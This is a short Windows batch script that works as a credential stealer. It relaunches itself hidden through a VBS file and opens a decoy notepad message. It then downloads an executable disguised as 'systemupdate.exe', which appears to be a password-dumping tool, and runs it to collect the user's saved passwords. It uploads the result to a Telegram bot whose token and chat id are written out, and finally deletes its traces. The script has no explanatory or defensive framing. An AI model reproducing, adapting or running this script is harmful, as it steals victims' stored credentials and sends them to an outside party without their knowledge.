@echo off
if exist "%temp%\sys.vbs" goto Steal
goto Cvbs

:Cvbs
echo Set objShell = CreateObject("WScript.Shell")>"%temp%\sys.vbs"
echo objShell.Run "cmd.exe /c \"%temp%\steal.bat\"", 0, True >>"%temp%\sys.vbs"
wscript.exe //nologo "%temp%\sys.vbs"
exit

:Steal
echo Your Password Is : 123 > "%temp%\password.txt" & start notepad "%temp%\password.txt"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/devilJM/Hacktool-For-Educational-Purposes/main/pass.exe' -OutFile '%temp%\systemupdate.exe'"
powershell -Command "& '%temp%\systemupdate.exe' /stext '%temp%\%username%-%computername%.txt'"
powershell -Command "Invoke-RestMethod -Uri 'https://api.telegram.org/bot6481424824:AAF448E2lOZMaAZxDqFtrGE_0UONAA8-wH0/sendDocument?chat_id=365617307' -Method Post -Form @{document=Get-Item '%temp%\%username%-%computername%.txt'; caption='Password From %username% - %computername%'}"
del "%temp%\systemupdate.exe"
del "%temp%\%username%-%computername%.txt"
del "%temp%\password.txt"
del "%temp%\sys.vbs"
exit
